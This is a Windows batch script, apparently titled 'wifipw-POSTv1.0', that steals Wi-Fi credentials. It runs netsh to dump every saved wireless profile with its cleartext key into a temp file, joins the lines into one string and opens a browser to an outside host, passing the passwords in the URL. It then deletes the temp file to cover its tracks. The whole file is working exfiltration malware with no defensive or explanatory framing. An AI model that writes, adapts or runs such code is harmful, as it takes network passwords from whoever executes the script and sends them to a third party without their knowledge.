@echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
netsh wlan show profile * key=clear>>%tmp%\wifi.url
set "website=http://terraria.onthewifi.com"

(
set /p line1=
set /p line2=
set /p line3=
set /p line4=
set /p line5=
set /p line6=
set /p line7=
set /p line8=
set /p line9=
set /p line10=
set /p line11=
set /p line12=
set /p line13=
set /p line14=
set /p line15=
set /p line16=
set /p line17=
set /p line18=
set /p line19=
set /p line20=
set /p line21=
set /p line22=
set /p line24=
set /p line25=
set /p line26=
set /p line27=
set /p line28=
set /p line29=
set /p line30=
set /p line31=
set /p line32=
set /p line33=
set /p line34=
set /p line35=
set /p line36=
set /p line37=
set /p line38=
set /p line39=
set /p line40=
set /p line41=
set /p line42=
set /p line43=
set /p line44=
set /p line45=
set /p line46=
set /p line47=
set /p line48=
set /p line49=
set /p line50=
set /p line51=
set /p line52=
set /p line53=
set /p line54=
set /p line55=
set /p line56=
set /p line57=
set /p line58=
set /p line59=
set /p line60=
set /p line61=
)<%tmp%\wifi.url

set "wifi=%line1%%line2%%line3%%line4%%line5%%line6%%line7%%line8%%line9%%line10%%line11%%line12%%line13%%line14%%line15%%line16%%line17%%line18%%line19%%line20%%line21%%line22%%line23%%line24%%line25%%line25%%line26%%line27%%line28%%line29%%line30%%line31%%line32%%line33%%line34%%line35%%line36%%line37%%line38%%line39%%line40%%line41%%line42%%line43%%line44%%line45%%line46%%line47%%line48%%line49%%line50%%line51%%line52%%line53%%line54%%line55%%line56%%line57%%line58%%line59%%line60%%line61%"
echo %wifi%
start %website%/?"%wifi%"
del %tmp%\wifi.url
set /p "end="
exit